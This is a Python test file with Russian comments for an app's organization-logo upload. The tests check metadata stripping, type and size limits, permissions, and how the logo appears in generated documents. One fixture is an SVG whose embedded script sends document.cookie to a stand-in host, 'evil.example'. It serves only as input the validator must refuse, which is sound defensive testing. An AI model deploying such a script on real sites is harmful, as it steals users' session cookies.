"""Логотип организации в документах (пакет L, L9).

Консультант отдаёт план клиенту под своим именем. Проверяется то, на чём такая функция
обычно подводит молча: SVG с кодом уезжает в чужие документы, имя автора и место съёмки
из метаданных файла — тоже, к картинке прицеплен посторонний хвост, логотип не доходит до
документа, открытого по ссылке, а после удаления организации картинка остаётся в базе.
"""
from __future__ import annotations

import base64
import io
import struct
import zipfile
import zlib

import pytest
from docx.image.image import Image as DocxImage
from docx.shared import Cm

from app import branding
from app.db_models import AuditLogEntry, OrgBranding

# --- Картинки для проверки (без сторонних библиотек: так видно, что внутри файла) ---


def _chunk(kind: bytes, data: bytes) -> bytes:
    return (struct.pack(">I", len(data)) + kind + data
            + struct.pack(">I", zlib.crc32(kind + data) & 0xFFFFFFFF))


def png(width: int = 40, height: int = 20, *, extra: list[tuple[bytes, bytes]] = (),
        tail: bytes = b"") -> bytes:
    """PNG-картинка; ``extra`` — блоки до картинки, ``tail`` — хвост после её конца."""
    ihdr = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
    raw = b"".join(b"\x00" + b"\x10\x80\x40" * width for _ in range(height))
    chunks = [_chunk(b"IHDR", ihdr)]
    chunks += [_chunk(kind, data) for kind, data in extra]
    chunks += [_chunk(b"IDAT", zlib.compress(raw)), _chunk(b"IEND", b"")]
    return b"\x89PNG\r\n\x1a\n" + b"".join(chunks) + tail


def _segment(marker: int, data: bytes) -> bytes:
    return bytes([0xFF, marker]) + struct.pack(">H", len(data) + 2) + data


def jpeg(width: int = 64, height: int = 32, *, exif: bytes = b"", comment: bytes = b"",
         tail: bytes = b"") -> bytes:
    """JPEG-заголовки, какие бывают у снимка с камеры: EXIF вместо JFIF, комментарий."""
    parts = [b"\xff\xd8"]
    if exif:
        parts.append(_segment(0xE1, b"Exif\x00\x00" + exif))
    if comment:
        parts.append(_segment(0xFE, comment))
    parts.append(_segment(0xDB, b"\x00" + bytes(range(64))))
    parts.append(_segment(0xC0, struct.pack(">BHHB", 8, height, width, 3)
                          + b"\x01\x22\x00\x02\x11\x00\x03\x11\x00"))
    parts.append(_segment(0xDA, b"\x03\x01\x00\x02\x11\x03\x11\x00\x3f\x00"))
    parts.append(b"\x12\x34\x56\x78" * 8 + b"\xff\xd9")
    return b"".join(parts) + tail


SVG = (b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg">'
       b'<script>fetch("https://evil.example/?c="+document.cookie)</script></svg>')


def b64(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


# --- Правила приёма ---

def test_png_metadata_and_tail_are_removed_the_picture_is_kept():
    """В текстовых блоках бывают автор и программа, после конца картинки — посторонний
    хвост. Документ уходит третьим лицам: ни то ни другое туда не едет."""
    source = png(extra=[(b"tEXt", "Author\x00Иван Петров".encode()),
                        (b"eXIf", b"MM\x00*GPS 55.7558"), (b"tIME", b"\x07\xea\x0a\x05\x09\x00\x00")],
                 tail=b"PK\x03\x04hidden.zip")
    logo = branding.accept(source)
    assert "Иван".encode() not in logo.data and b"GPS" not in logo.data
    assert b"tEXt" not in logo.data and b"tIME" not in logo.data
    assert b"hidden" not in logo.data and logo.data.endswith(_chunk(b"IEND", b""))
    assert (logo.mime, logo.width, logo.height) == ("image/png", 40, 20)
    assert DocxImage.from_blob(logo.data).px_width == 40


def test_jpeg_exif_is_removed_and_the_file_still_opens_in_the_document():
    """У снимка с камеры JFIF-заголовка нет, только EXIF. Вычистив EXIF, файл надо
    оставить читаемым для генератора документа — иначе логотип уронил бы выгрузку."""
    source = jpeg(exif=b"MM\x00*Artist=Ivan Petrov;GPS=55.7558,37.6173",
                  comment=b"made by Ivan", tail=b"<script>")
    logo = branding.accept(source)
    assert b"Ivan" not in logo.data and b"GPS" not in logo.data
    assert logo.data[6:10] == b"JFIF"
    assert logo.data.endswith(b"\xff\xd9")                     # хвост после конца отрезан
    assert (logo.mime, logo.width, logo.height) == ("image/jpeg", 64, 32)
    image = DocxImage.from_blob(logo.data)
    assert (image.px_width, image.px_height) == (64, 32)


def test_svg_is_refused_with_its_own_reason():
    with pytest.raises(branding.LogoError) as err:
        branding.accept(SVG)
    assert str(err.value) == branding.SVG_REFUSAL
    assert "исполняемый код" in str(err.value)


@pytest.mark.parametrize("data", [b"GIF89a\x01\x00\x01\x00", b"RIFF\x00\x00\x00\x00WEBPVP8 ",
                                  b"%PDF-1.7"])
def test_the_type_is_read_from_the_content_not_the_name(data):
    with pytest.raises(branding.LogoError, match="Принимаются PNG и JPEG"):
        branding.accept(data)


@pytest.mark.parametrize("data", [
    b"\x89PNG\r\n\x1a\n" + b"\x00" * 30,                  # подпись есть, картинки нет
    png()[:-12],                                          # конца картинки нет
    jpeg()[:-2],                                          # JPEG без конца картинки
])
def test_a_broken_file_is_refused_not_stored(data):
    with pytest.raises(branding.LogoError):
        branding.accept(data)


def test_the_size_limit_names_the_actual_size():
    big = png(tail=b"\x00" * (branding.MAX_LOGO_BYTES + 10_000))
    with pytest.raises(branding.LogoError) as err:
        branding.accept(big)
    assert "256 КБ" in str(err.value) and "266 КБ" in str(err.value)


def test_a_huge_picture_is_refused_by_its_sides():
    with pytest.raises(branding.LogoError, match="5000×10 px"):
        branding.accept(png(5000, 10))


def test_base64_garbage_is_named():
    with pytest.raises(branding.LogoError, match="base64"):
        branding.decode("это не картинка!")


def test_the_title_box_keeps_proportions():
    """Высокий логотип не занимает полстраницы: рамка ограничивает обе стороны."""
    wide = branding.Logo(data=b"", mime="image/png", width=400, height=100)
    tall = branding.Logo(data=b"", mime="image/png", width=100, height=400)
    w, h = branding.docx_size(wide)
    assert (w, h) == (Cm(5), Cm(1.25))
    w, h = branding.docx_size(tall)
    assert h == Cm(2.5) and abs(w - Cm(0.625)) <= 1


# --- Маршруты ---

def _org(client, register, email="owner@e.ru", org="Консалтинг"):
    headers = register(email=email, org=org)
    org_id = client.get("/api/v1/organizations", headers=headers).json()[0]["id"]
    return headers, org_id


def _member(client, register, owner, org_id, email="analyst@e.ru", role="analyst"):
    headers = register(email=email, org=f"Личная {email}")
    client.post(f"/api/v1/organizations/{org_id}/members",
                json={"email": email, "full_name": "А", "role": role}, headers=owner)
    return {**headers, "X-Organization-Id": org_id}


def _put(client, headers, org_id, data: bytes):
    return client.put(f"/api/v1/organizations/{org_id}/logo", headers=headers,
                      json={"data_base64": b64(data)})


def _media(docx: bytes) -> list[str]:
    with zipfile.ZipFile(io.BytesIO(docx)) as z:
        return [n for n in z.namelist() if n.startswith("word/media/")]


def test_the_logo_is_set_seen_by_members_and_journaled(client, register, db_session):
    owner, org_id = _org(client, register)
    r = _put(client, owner, org_id, png())
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["present"] is True and body["kind"] == "PNG"
    assert (body["width"], body["height"]) == (40, 20)
    assert body["data_url"].startswith("data:image/png;base64,")
    assert body["updated_by"] == "owner@e.ru"
    assert any("SVG не принимается" in rule for rule in body["rules"])

    analyst = _member(client, register, owner, org_id)
    seen = client.get(f"/api/v1/organizations/{org_id}/logo", headers=analyst).json()
    assert seen["data_url"] == body["data_url"]

    entry = db_session.query(AuditLogEntry).filter_by(action="org.logo_set").one()
    assert entry.details == "PNG, 1 КБ, 40×20 px"


def test_without_a_logo_the_answer_says_so_and_still_carries_the_rules(client, register):
    owner, org_id = _org(client, register)
    body = client.get(f"/api/v1/organizations/{org_id}/logo", headers=owner).json()
    assert body["present"] is False and body["data_url"] is None
    assert len(body["rules"]) == len(branding.RULES)


def test_only_who_manages_the_organization_sets_its_logo(client, register):
    owner, org_id = _org(client, register)
    analyst = _member(client, register, owner, org_id)
    assert _put(client, analyst, org_id, png()).status_code == 403
    assert client.delete(f"/api/v1/organizations/{org_id}/logo",
                         headers=analyst).status_code == 403


def test_the_refusal_reason_reaches_the_client(client, register, db_session):
    owner, org_id = _org(client, register)
    r = _put(client, owner, org_id, SVG)
    assert r.status_code == 422 and r.json()["detail"] == branding.SVG_REFUSAL
    assert db_session.query(OrgBranding).count() == 0
    assert db_session.query(AuditLogEntry).filter_by(action="org.logo_set").count() == 0


def test_a_new_logo_replaces_the_old_one(client, register, db_session):
    owner, org_id = _org(client, register)
    _put(client, owner, org_id, png(40, 20))
    _put(client, owner, org_id, jpeg(64, 32))
    rows = db_session.query(OrgBranding).all()
    assert len(rows) == 1 and rows[0].logo_mime == "image/jpeg"


def test_removing_is_journaled_and_removing_nothing_is_silent(client, register, db_session):
    owner, org_id = _org(client, register)
    _put(client, owner, org_id, png())
    assert client.delete(f"/api/v1/organizations/{org_id}/logo",
                         headers=owner).status_code == 204
    assert client.delete(f"/api/v1/organizations/{org_id}/logo",
                         headers=owner).status_code == 204
    assert db_session.query(AuditLogEntry).filter_by(action="org.logo_remove").count() == 1
    assert client.get(f"/api/v1/organizations/{org_id}/logo",
                      headers=owner).json()["present"] is False


def test_another_organization_does_not_see_the_logo(client, register):
    owner, org_id = _org(client, register)
    _put(client, owner, org_id, png())
    stranger, _ = _org(client, register, email="other@e.ru", org="Чужие")
    r = client.get(f"/api/v1/organizations/{org_id}/logo", headers=stranger)
    assert r.status_code in (403, 404)


# --- Документы ---

def _project(client, headers) -> str:
    model = client.get("/api/v1/sample").json()
    return client.post("/api/v1/projects", json={"name": "Завод", "model": model},
                       headers=headers).json()["id"]


def test_the_business_plan_carries_the_logo_and_without_it_stays_as_before(client, register):
    owner, org_id = _org(client, register)
    pid = _project(client, owner)
    plain = client.get(f"/api/v1/projects/{pid}/business-plan.docx", headers=owner).content
    assert _media(plain) == []
    _put(client, owner, org_id, png())
    branded = client.get(f"/api/v1/projects/{pid}/business-plan.docx", headers=owner).content
    (name,) = _media(branded)
    with zipfile.ZipFile(io.BytesIO(branded)) as z:
        assert z.read(name) == branding.accept(png()).data


def test_the_audit_report_carries_the_logo(client, register):
    owner, org_id = _org(client, register)
    _put(client, owner, org_id, jpeg())
    sid = client.post("/api/v1/audit/subjects/demo", headers=owner).json()["id"]
    docx = client.get(f"/api/v1/audit/subjects/{sid}/report.docx", headers=owner).content
    assert len(_media(docx)) == 1


def test_a_plan_opened_by_link_carries_the_senders_logo(client, register):
    """План по ссылке — документ организации-отправителя: логотип читается в тех же
    дверях арендатора, что и снимок, и доходит и до страницы, и до DOCX."""
    owner, org_id = _org(client, register)
    pid = _project(client, owner)
    _put(client, owner, org_id, png())
    link = client.post(f"/api/v1/projects/{pid}/share-links", headers=owner,
                       json={"label": "Сбербанк"}).json()
    page = client.get(f"/api/v1/shared/{link['token']}").json()
    assert page["organization_logo"].startswith("data:image/png;base64,")
    docx = client.get(f"/api/v1/shared/{link['token']}/business-plan.docx").content
    assert len(_media(docx)) == 1


def test_a_link_without_a_logo_says_none(client, register):
    owner, _ = _org(client, register)
    pid = _project(client, owner)
    link = client.post(f"/api/v1/projects/{pid}/share-links", headers=owner,
                       json={"label": "Банк"}).json()
    assert client.get(f"/api/v1/shared/{link['token']}").json()["organization_logo"] is None


# --- Выгрузка и уход ---

def test_the_export_carries_the_logo_and_says_it_is_the_only_picture(client, register):
    owner, org_id = _org(client, register)
    _put(client, owner, org_id, png())
    export = client.get(f"/api/v1/organizations/{org_id}/export", headers=owner).json()
    logo = export["логотип"]
    assert base64.b64decode(logo["данные_base64"]) == branding.accept(png()).data
    assert (logo["тип"], logo["ширина_px"], logo["высота_px"]) == ("image/png", 40, 20)
    assert any("логотип организации" in line for line in export["о_выгрузке"]["что_внутри"])


def test_the_logo_leaves_with_the_organization(client, register, db_session):
    owner, org_id = _org(client, register)
    _put(client, owner, org_id, png())
    r = client.request("DELETE", f"/api/v1/organizations/{org_id}",
                       json={"password": "secret123"}, headers=owner)
    assert r.status_code == 200, r.text
    assert db_session.query(OrgBranding).count() == 0
